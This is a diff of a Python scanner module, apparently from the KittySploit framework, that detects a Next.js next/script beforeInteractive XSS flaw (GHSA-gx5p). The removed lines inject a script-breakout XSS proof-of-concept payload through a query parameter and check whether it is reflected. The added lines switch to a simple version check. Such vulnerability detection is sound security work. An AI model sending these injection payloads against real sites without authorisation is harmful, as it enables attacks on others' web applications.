@@ -1,97 +1,44 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-from urllib.parse import quote
-
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
-from lib.scanner.http.nextjs_probe import ensure_nextjs_target
-
-_DEFAULT_FRAGMENT = '</script><script>window.__pwn=true;alert("VALIDATION_TOKEN")</script><x x="'
-_PUSH = "(self.__next_s=self.__next_s||[]).push("
-_NEEDLE = "</script><script>"
-_ESCAPED = "\\u003c/script\\u003e\\u003cscript\\u003e"
+from lib.scanner.http.nextjs_probe import run_nextjs_version_scan
 
 
 class Module(Scanner, Http_client):
     __info__ = {
-        "name": "Next.js next/script beforeInteractive XSS (GHSA-gx5p) — detect",
+        "name": "Next.js next/script beforeInteractive XSS (GHSA-gx5p) detection",
         "description": (
-            "GET with reflected PoC query param; positive if `</script><script>` appears after "
-            "`__next_s` push block. Standalone scanner."
+            "Fingerprints Next.js and flags versions < 16.2.5 affected by GHSA-gx5p-jg67-6x7h "
+            "(next/script beforeInteractive XSS)."
         ),
         "author": ["KittySploit Team"],
         "severity": "high",
+        "advisory": "GHSA-gx5p-jg67-6x7h",
         "references": ["https://github.com/advisories/GHSA-gx5p-jg67-6x7h"],
-        "tags": ["scanner", "http", "nextjs", "xss"],
-    'agent': {
-        'risk': 'active',
-        'effects': ['network_probe'],
-        'expected_requests': 2,
-        'reversible': True,
-        'approval_required': False,
-        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
-    },
+        "modules": [
+            "auxiliary/scanner/http/nextjs_ghsa_gx5p_jg67_6x7h_script_before_interactive_xss",
+        ],
+        "tags": ["scanner", "nextjs", "xss", "ghsa-gx5p"],
+        "agent": {
+            "risk": "active",
+            "effects": ["network_probe"],
+            "expected_requests": 1,
+            "reversible": True,
+            "approval_required": False,
+            "produces": ["tech_hints", "risk_signals", "endpoints"],
+            "cost": 1.0,
+            "noise": 0.2,
+            "value": 1.0,
+        },
     }
 
-    inject_param = OptString("tid", "Query parameter for encoded payload", required=False)
-    xss_payload_override = OptString("", "Override raw payload (empty = PoC)", required=False, advanced=True)
-
-    def _o(self, opt):
-        if hasattr(opt, "value"):
-            return opt.value
-        if hasattr(opt, "__get__"):
-            try:
-                return opt.__get__(self, type(self))
-            except Exception:
-                pass
-        return opt
-
-    def _url(self):
-        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
-        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
-        path = str(self.path).strip() or "/"
-        if not path.startswith("/"):
-            path = "/" + path
-        return f"{proto}://{t}:{p}{path}"
-
-    def _probe_url(self) -> str:
-        frag = str(self._o(self.xss_payload_override) or "").strip() or _DEFAULT_FRAGMENT
-        enc = quote(frag, safe="")
-        base = self._url()
-        sep = "&" if "?" in base else "?"
-        name = str(self._o(self.inject_param) or "tid").strip() or "tid"
-        return f"{base}{sep}{name}={enc}"
-
-    @staticmethod
-    def _classify(body: str) -> str:
-        if not body:
-            return "empty"
-        push_idx = body.find(_PUSH)
-        tail = body[push_idx:] if push_idx != -1 else body
-        if _NEEDLE in tail:
-            return "vulnerable"
-        if _ESCAPED in body:
-            return "patched"
-        return "inconclusive"
-
     def run(self):
-        if not ensure_nextjs_target(self):
-            return False
-        try:
-            r = self.get(self._probe_url(), timeout=float(self._o(self.timeout)))
-        except Exception as e:
-            self.set_info(reason=str(e))
-            return False
-        if r.status_code != 200:
-            self.set_info(reason=f"HTTP {r.status_code}")
-            return False
-        v = self._classify(r.text)
-        if v == "vulnerable":
-            self.set_info(reason="__next_s context breakout", confidence="high")
-            return True
-        if v == "patched":
-            self.set_info(reason="escaped (patched)", confidence="high")
-            return False
-        self.set_info(reason="inconclusive", confidence="low")
-        return False
+        return run_nextjs_version_scan(
+            self,
+            advisory="GHSA-gx5p-jg67-6x7h",
+            patched_version="16.2.5",
+            issue_label="GHSA-gx5p next/script beforeInteractive XSS",
+            severity="high",
+        )
